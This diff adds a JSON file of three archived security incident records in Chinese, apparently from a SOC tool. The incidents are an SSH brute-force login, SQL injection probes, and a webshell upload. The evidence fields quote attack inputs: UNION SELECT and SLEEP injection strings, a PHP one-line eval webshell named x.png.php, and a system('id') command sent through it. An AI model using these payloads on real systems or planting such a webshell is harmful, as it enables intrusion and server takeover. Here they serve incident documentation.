@@ -1,0 +1,40 @@
+[ {
+  "id" : "EVT-20261010-193426-223a",
+  "title" : "SSH 暴力破解得手（成功登录 web-01）",
+  "severity" : "严重",
+  "type" : "暴力破解",
+  "srcIp" : "103.146.184.77",
+  "assets" : [ "web-01", "10.0.0.11" ],
+  "occurredAt" : "2026-09-28 02:14:37",
+  "archivedAt" : "2026-10-10 19:34:26",
+  "status" : "已闭环",
+  "summary" : "Wazuh 规则 5712 命中：来源 103.146.184.77 对 web-01(10.0.0.11) 的 sshd 在 10 分钟内发起 412 次 root/admin 口令尝试，最终出现一次 Accepted password 成功登录。研判为暴力破解得手，已第一时间封禁源 IP 并重置 root 口令。",
+  "rawEvidence" : "rule: 5712 / sshd: brute force\nsrc=103.146.184.77 dst=web-01(10.0.0.11):22\nSep 28 02:04:11 web-01 sshd[10231]: Failed password for root from 103.146.184.77 port 22 ssh2\n...（连续失败 412 次）...\nSep 28 02:14:37 web-01 sshd[10588]: Accepted password for root from 103.146.184.77 port 51234 ssh2\nSep 28 02:14:40 web-01 su[10590]: (to root) root on pts/0",
+  "handler" : "analyst01"
+}, {
+  "id" : "EVT-20261010-193426-6709",
+  "title" : "SQL 注入探测命中 web-02 登录接口",
+  "severity" : "高危",
+  "type" : "SQL注入",
+  "srcIp" : "45.83.91.12",
+  "assets" : [ "web-02", "10.0.0.12" ],
+  "occurredAt" : "2026-09-28 09:42:05",
+  "archivedAt" : "2026-10-10 19:34:26",
+  "status" : "处置中",
+  "summary" : "Suricata ET 规则命中：来源 45.83.91.12 对 web-02 的 /api/login 发起联合查询注入，载荷含 UNION SELECT 与 SLEEP 盲注特征。WAF 已拦截，未造成拖库，继续观察是否升级。",
+  "rawEvidence" : "alert: ET WEB SQL Injection Attempt\nsrc=45.83.91.12 dst=web-02(10.0.0.12):443\nGET /api/login?user=admin' UNION SELECT 1,version(),3-- -&pass=x HTTP/1.1\nGET /api/login?user=admin' AND SLEEP(5)-- - HTTP/1.1\nresponse: 403 Forbidden (WAF)",
+  "handler" : "admin"
+}, {
+  "id" : "EVT-20261010-193426-112f",
+  "title" : "Webshell 落地检测（web-01 上传一句话木马）",
+  "severity" : "严重",
+  "type" : "Webshell",
+  "srcIp" : "103.146.184.77",
+  "assets" : [ "web-01", "10.0.0.11" ],
+  "occurredAt" : "2026-09-28 11:05:52",
+  "archivedAt" : "2026-10-10 19:34:26",
+  "status" : "处置中",
+  "summary" : "文件上传检测发现 web-01 的 /var/www/html/uploads/ 下出现可疑 PHP 文件，内容为一句话木马（@eval($_POST[cmd])），并已发生一次外联。研判为 Webshell 落地，已隔离文件并对源 IP 二次封禁，待排查横向移动。",
+  "rawEvidence" : "file: /var/www/html/uploads/x.png.php (size 68)\n<?php @eval($_POST['cmd']); ?>\nsrc=103.146.184.77 POST /uploads/x.png.php HTTP/1.1\nbody: cmd=system('id');\nout: uid=33(www-data) gid=33(www-data)",
+  "handler" : "admin"
+} ]
